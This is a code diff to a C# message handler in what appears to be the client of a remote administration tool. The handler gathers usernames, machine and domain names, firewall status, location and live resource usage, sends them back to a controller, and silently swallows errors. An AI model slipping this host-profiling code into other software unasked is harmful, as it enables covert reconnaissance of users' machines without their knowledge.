@@ -33,20 +33,22 @@ namespace Pulsar.Client.Messages
         {
             try
             {
-                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
-
-                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
-                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
+                var properties = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties();
+                var domainName = string.IsNullOrEmpty(properties.DomainName) ? "-" : properties.DomainName;
+                var hostName = string.IsNullOrEmpty(properties.HostName) ? "-" : properties.HostName;
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
                 var userAccount = new UserAccount();
                 string defaultBrowser = SystemHelper.GetDefaultBrowser();
 
+                // Get dynamic metrics
+                float cpuUsage = SystemHelper.GetCpuUsage();
+                var (ramUsed, ramTotal, ramPercent) = SystemHelper.GetRamUsage();
+                var (diskFree, diskTotal, diskPercentUsed) = SystemHelper.GetDiskUsage();
+                var (netSent, netRecv) = SystemHelper.GetNetworkUsage();
+
                 List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
-                    new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
-                    new Tuple<string, string>("Memory (RAM)", $"{HardwareDevices.TotalPhysicalMemory} MB"),
-                    new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuNames),
                     new Tuple<string, string>("Username", userAccount.UserName),
                     new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
                     new Tuple<string, string>("Domain Name", domainName),
@@ -63,13 +65,20 @@ namespace Pulsar.Client.Messages
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                     new Tuple<string, string>("Time Zone", geoInfo.Timezone),
                     new Tuple<string, string>("Country", geoInfo.Country),
-                    new Tuple<string, string>("Default Browser", defaultBrowser)
+                    new Tuple<string, string>("Default Browser", defaultBrowser),
+                    new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuNames),
+                    new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
+                    new Tuple<string, string>("CPU Usage", cpuUsage >= 0 ? $"{cpuUsage:F1} %" : "N/A"),
+                    new Tuple<string, string>("Memory (RAM)", $"{ramUsed:F0} MB / {ramTotal:F0} MB ({ramPercent:F1} %)"),
+                    new Tuple<string, string>("Disk Space", $"{diskTotal - diskFree} MB / {diskTotal} MB ({diskPercentUsed:F1} %)"),
+                    new Tuple<string, string>("Network Usage", $"Sent: {netSent / 1024} KB/s, Recv: {netRecv / 1024} KB/s"),
                 };
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
             }
             catch
             {
+                // silently fail
             }
         }
     }
